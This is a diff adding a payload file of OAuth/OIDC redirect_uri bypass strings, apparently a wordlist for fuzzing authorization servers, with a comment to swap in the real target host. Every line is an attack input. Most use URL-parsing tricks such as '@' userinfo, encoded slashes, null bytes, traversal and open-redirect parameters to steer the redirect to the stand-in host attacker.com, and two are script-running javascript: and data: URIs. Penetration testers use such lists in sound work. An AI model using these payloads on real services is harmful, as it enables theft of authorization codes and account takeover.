@@ -1,0 +1,22 @@
+# OAuth/OIDC redirect_uri bypass payloads
+# Replace 'legitimate.com' with actual target host at runtime
+https://attacker.com
+https://attacker.com@legitimate.com
+https://legitimate.com.attacker.com
+https://legitimate.com%40attacker.com
+https://legitimate.com%2F%2Fattacker.com
+//attacker.com
+https://legitimate.com/callback?rd=https://attacker.com
+https://legitimate.com/callback/..%2f..%2fattacker.com
+https://legitimate.com/callback#@attacker.com
+https://legitimate.com\\@attacker.com
+https://legitimate.com/callback/../../../attacker.com
+https://legitimate.com:443@attacker.com
+https://legitimate.com%00@attacker.com
+https://legitimate.com%09@attacker.com
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+https://legitimate.com/callback?next=https://attacker.com
+https://legitimate.com/callback%23@attacker.com
+https://attacker.com/.legitimate.com
+https://legitimate.com@attacker.com/
